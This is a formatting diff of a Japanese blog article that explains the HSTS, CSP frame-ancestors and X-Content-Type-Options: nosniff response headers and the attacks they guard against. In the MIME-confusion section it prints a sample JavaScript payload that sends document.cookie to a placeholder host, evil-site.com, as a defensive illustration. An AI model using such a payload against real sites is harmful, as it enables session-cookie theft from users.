@@ -4,18 +4,19 @@ public: true
 date: 2025-03-28
 icon: https://raw.githubusercontent.com/microsoft/fluentui-emoji/main/assets/Ambulance/Flat/ambulance_flat.svg
 slug: response-header-web-check-list
-tags: 
+tags:
   - セキュリティ
 description: Webサービス公開前のチェックリストにあるレスポンスヘッダの意味が全くわからなかったので、どんなリスクから守ってくれるのかを調べてみました。この記事ではWebサービスを公開する前に必要なレスポンスヘッダの内容と設定しなかったときのリスクを知ることができます。
 ---
 
-
 ## はじめに
 
 レスポンスヘッダの設定値をあまり気にしてきたことがなかったので、下記記事で公開されているレスポンスヘッダの内容を調べてみました。
-<LinkPreview url="https://zenn.dev/catnose99/articles/547cbf57e5ad28" />
+
+<LinkPreview url='https://zenn.dev/catnose99/articles/547cbf57e5ad28' />
 
 記載されている内容は下記の3つです。
+
 - Strict-Transport-Security
 - Content-Security-Policy: frame-ancestors
 - X-Content-Type-Options: nosniff
@@ -24,7 +25,6 @@ description: Webサービス公開前のチェックリストにあるレスポ�
 
 ## Strict-Transport-Security (HSTS) の詳細解説
 
-
 ### 背景と基本概念
 
 HTTP Strict Transport Security (HSTS) は、Webサイトが「HTTPS接続のみを使用する」ことをブラウザに強制的に指示するための仕組みです。
@@ -32,13 +32,15 @@ HTTP Strict Transport Security (HSTS) は、Webサイトが「HTTPS接続のみ�
 
 従来のHTTP通信では、最初にHTTPでアクセスした後、サーバーからリダイレクトを受けてHTTPSに切り替えるというプロセスが一般的でした。
 この「HTTP→HTTPS」の移行過程に潜在的なセキュリティホールが存在していました。HSTSはこの問題を解決するために設計されています。
-<LinkPreview url="https://developer.mozilla.org/ja/docs/Web/HTTP/Reference/Headers/Strict-Transport-Security" />
+
+<LinkPreview url='https://developer.mozilla.org/ja/docs/Web/HTTP/Reference/Headers/Strict-Transport-Security' />
 
 ### 実際の攻撃(SSLストリッピング攻撃)
 
 2009年、セキュリティ研究者のMoxie Marlinspike氏が「sslstrip」というツールを発表しました。このツールは、ユーザーとウェブサイト間の通信を傍受し、HTTPS接続をHTTPにダウングレードするという攻撃（SSLストリッピング攻撃）を可能にします。
 
 以下のような例です。
+
 1. ユーザーが「example.com」とブラウザに入力する（HTTPSを明示的に指定していない）
 2. ブラウザは最初にHTTP経由でリクエストを送信
 3. 通常なら、サーバーは「https://~~」へのリダイレクトを返す
@@ -49,11 +51,9 @@ HTTP Strict Transport Security (HSTS) は、Webサイトが「HTTPS接続のみ�
 この攻撃は、公共Wi-Fiなどの信頼できないネットワークで非常に危険です。
 ユーザーはHTTPSの鍵アイコンを見ないかもしれませんが、多くの場合そのような細かい点を見落としがちです。
 
-<Callout type="info" title="">
+<Callout type='info' title=''>
   公共Wi-Fiを接続するときは鍵アイコン(HTTPS)が設定されていることを確認しましょう。
 </Callout>
-
-
 
 ### HSTSの仕組みと効果
 
@@ -62,7 +62,6 @@ HSTSはこの問題に対処するために、Webサイトが以下の指示を�
 ```bash
 Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
 ```
-
 
 ### パラメータの詳細
 
@@ -83,17 +82,18 @@ Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
 
 あるユーザーが公共Wi-Fiからオンラインバンキングにアクセスするシナリオを考えてみましょう。
 銀行サイトがHSTSを実装していない場合は、このような事象が発生するかもしれません。
+
 1. ユーザーがブラウザのアドレスバーに「mybank.com」と入力
 2. 攻撃者が中間者攻撃を仕掛け、HTTP接続を維持したまま、バンク風の偽サイトを表示
 3. ユーザーは偽サイトに自分のユーザー名とパスワードを入力
 4. 攻撃者はこの情報を捕捉し、実際の銀行サイトに転送して認証を完了
 5. ユーザーは正常にログインできたと思い込み、攻撃に気付かない
 
-
 ## 中間者攻撃
 
 中間者攻撃（MITM攻撃）とは、通信を行っている二者（例えばユーザーとウェブサイト）の間に第三者が入り込み、両者は互いに直接通信していると思っているのに、実際にはその第三者が通信を傍受・監視・改ざんしている状態を指します。
-<LinkPreview url="https://developer.mozilla.org/ja/docs/Glossary/MitM" />
+
+<LinkPreview url='https://developer.mozilla.org/ja/docs/Glossary/MitM' />
 
 ### 基本的な仕組み
 
@@ -108,14 +108,12 @@ Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
    サーバー → 攻撃者 → ユーザー
    ```
 
-
 ### よくある攻撃シナリオ
 
 1. 攻撃者がカフェなどで「Free Wi-Fi」という偽のアクセスポイントを設置
 2. ユーザーが何も疑わずに接続
 3. すべての通信が攻撃者を経由
 4. 暗号化されていない情報（HTTP通信など）はすべて攻撃者に見られる
-
 
 ### 攻撃の具体的な影響
 
@@ -124,9 +122,7 @@ Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
 - **データの改ざん**: 送受信される情報を変更する（例：銀行振込先の口座番号を変更）
 - **マルウェア注入**: ダウンロードファイルにマルウェアを追加する
 
-
 ## Content-Security-Policy: frame-ancestors
-
 
 ### 背景と基本概念
 
@@ -136,7 +132,8 @@ CSPは複数のディレクティブで構成されており、その中の一�
 `frame-ancestors` ディレクティブは、どのサイトがあなたのウェブページを iframe、frame、object、embed、applet などの要素内に表示（埋め込み）できるかを制御します。
 
 これは「クリックジャッキング」と呼ばれる攻撃から保護するために導入されました。
-<LinkPreview url="https://developer.mozilla.org/ja/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/frame-ancestors" />
+
+<LinkPreview url='https://developer.mozilla.org/ja/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/frame-ancestors' />
 
 ### クリックジャッキング攻撃とその歴史
 
@@ -151,11 +148,13 @@ CSPは複数のディレクティブで構成されており、その中の一�
 ### 従来の対策とその限界: X-Frame-Options
 
 クリックジャッキングへの最初の対応策として、2009年にMicrosoftが `X-Frame-Options` HTTPヘッダーを導入しました。このヘッダーは3つの値をサポートしていました:
+
 - `DENY`: ページをフレーム内に表示することを完全に禁止
 - `SAMEORIGIN`: 同一オリジンからのフレーミングのみを許可
 - `ALLOW-FROM uri`: 特定のURIからのフレーミングのみを許可
 
 しかし`X-Frame-Options` にはいくつかの制限がありました。
+
 1. 複数のドメインを許可するメカニズムがなかった（`ALLOW-FROM` は一度に1つのURIしか指定できない）
 2. ブラウザのサポートが不完全だった（特に `ALLOW-FROM` のサポート）
 3. CSPの他のセキュリティ機能と統合できなかった
@@ -171,6 +170,7 @@ Content-Security-Policy: frame-ancestors <source> <source> ...
 ```
 
 ここで `<source>` は以下のいずれかになります:
+
 - `'none'`: どのサイトからもフレーム内に表示されることを許可しない
 - `'self'`: 同一オリジンからのフレーミングのみを許可
 - `<origin>`: 特定のオリジン（例：trusted-site.com）からのフレーミングを許可
@@ -179,13 +179,12 @@ Content-Security-Policy: frame-ancestors <source> <source> ...
 ### frame-ancestors の実際の動作
 
 ブラウザがウェブページを読み込もうとした際、そのページが iframe などのフレーム内に表示されている場合、ブラウザは以下の手順でチェックを行います。
+
 1. そのページの CSP `frame-ancestors` ディレクティブを確認
 2. 現在のフレーミングサイト（親ページ）のオリジンが許可リストに含まれているかを検証
 3. 含まれていない場合、ブラウザはフレームの読み込みをブロック
 
-
 ### 具体的な設定例と意味
-
 
 ```bash
 Content-Security-Policy: frame-ancestors 'self'
@@ -214,13 +213,13 @@ Content-Security-Policy: frame-ancestors https://trusted-partner.com https://adm
 上記のクリックジャッキング攻撃にさらされることです。
 ユーザーは意図しないアクションを実行させられる可能性があります。
 具体的には以下のような事象です。
+
 - 知らないうちに資金を送金
 - 意図しないソーシャルメディア投稿
 - アカウント設定の変更
 - プライバシー情報へのアクセス許可
 
 ## X-Content-Type-Options: nosniff
-
 
 ### 背景と基本概念
 
@@ -232,6 +231,7 @@ MIME Type（Multipurpose Internet Mail Extensions）は、ウェブ上で交換�
 
 ブラウザが受け取ったコンテンツのMIME Typeを決定する際、通常はサーバーからレスポンスで送られる `Content-Type` ヘッダーを参照します。
 しかし、以下のような状況が発生することがあります。
+
 1. サーバーが `Content-Type` ヘッダーを送信しない
 2. 送信されたMIME Typeが不正確である（設定ミスなど）
 3. ファイルの実際の内容と宣言されたMIME Typeが一致しない
@@ -251,10 +251,10 @@ MIME混同攻撃（MIME Confusion Attack）は、ブラウザのMIME Typeスニ�
 サイトがユーザーからテキストファイルのアップロードを許可していたとします。攻撃者は次のようなスクリプトを含む「innocent.txt」ファイルをアップロードします。
 
 ```javascript
-alert("Your site has been hacked");
-document.cookie = "stolenCookie=" + document.cookie;
+alert('Your site has been hacked');
+document.cookie = 'stolenCookie=' + document.cookie;
 var xhr = new XMLHttpRequest();
-xhr.open("GET", "https://evil-site.com/steal?cookie=" + document.cookie, true);
+xhr.open('GET', 'https://evil-site.com/steal?cookie=' + document.cookie, true);
 xhr.send();
 ```
 
@@ -267,6 +267,7 @@ xhr.send();
 `X-Content-Type-Options: nosniff` ヘッダーを設定すると、ブラウザのMIME Typeスニッフィングが無効になります。
 これにより、サーバーが宣言したMIME Typeのみが尊重され、内容に基づく推測は行われなくなります。
 具体的には、以下のような状況で保護が提供されます。
+
 1. **スクリプトとスタイルシートのコンテキスト**
    - `<script>` または `<style>` タグでリソースが読み込まれる場合、宣言されたMIME Typeが正しくない場合はブロックされる
    - 例えば、`text/plain` MIME Typeのリソースが `<script>` タグで読み込まれても実行されない
@@ -297,7 +298,6 @@ X-Content-Type-Options: nosniff
 2017年には、MIME Typeスニッフィングを利用して、あるソーシャルメディアプラットフォームのプライベートコンテンツを盗み出す手法が発見されました。
 
 攻撃者はユーザーを罠サイトに誘導し、スニッフィングを利用してプラットフォームのプライベートJSONデータを読み取ることができました。これは `X-Content-Type-Options: nosniff` ヘッダーで防止できたはずのものです。
-
 
 ## まとめ
 
